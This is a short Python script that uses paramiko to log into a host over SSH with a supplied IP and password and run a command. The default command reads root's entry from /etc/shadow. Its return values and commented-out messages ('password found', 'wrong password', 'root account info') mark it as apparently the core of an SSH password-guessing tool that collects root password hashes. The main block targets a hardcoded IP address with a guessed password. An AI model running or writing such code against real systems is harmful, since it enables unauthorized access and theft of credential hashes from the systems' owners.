#!/usr/bin/python3.4
# -*- coding=utf-8 -*-


import paramiko
import re

def ssh_connect(connection_option):
	try:
		if len(connection_option) < 2:
			print('参数错误：至少应该指派IP地址与密码')
		elif len(connection_option) == 2:
			ip = connection_option[0]
			passwd = connection_option[1]
			user = 'root'
			cmd = 'cat /etc/shadow | grep root'
			port = 22
		elif len(connection_option) == 3:
			ip = connection_option[0]
			passwd = connection_option[1]
			user = connection_option[2]
			cmd = 'cat /etc/shadow | grep root'
			port = 22
		elif len(connection_option) == 4:
			ip = connection_option[0]
			passwd = connection_option[1]
			user = connection_option[2]
			cmd = connection_option[3]
			port = 22
		elif len(connection_option) == 5:
			ip = connection_option[0]
			passwd = connection_option[1]
			user = connection_option[2]
			cmd = connection_option[3]
			port = connection_option[4]
		else:
			print('参数不正确')

		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(ip,port,user,passwd,timeout=5)
		stdin,stdout,stderr = ssh.exec_command(cmd)
		x = stdout.read().decode()
		ssh.close()
		#print('密码找到：' + passwd)
		#print('Root账号信息：'+ x)
		return (1,passwd,x)

	except Exception as e:
		if re.search('Authentication failed.', str(e)):
			#print('密码错误：' + passwd)
			return (0,passwd)
		else:
			pass
		ssh.close()

if __name__ == '__main__':
	ssh_connect(['202.100.1.139','Cisc0123','root','uname -a',22])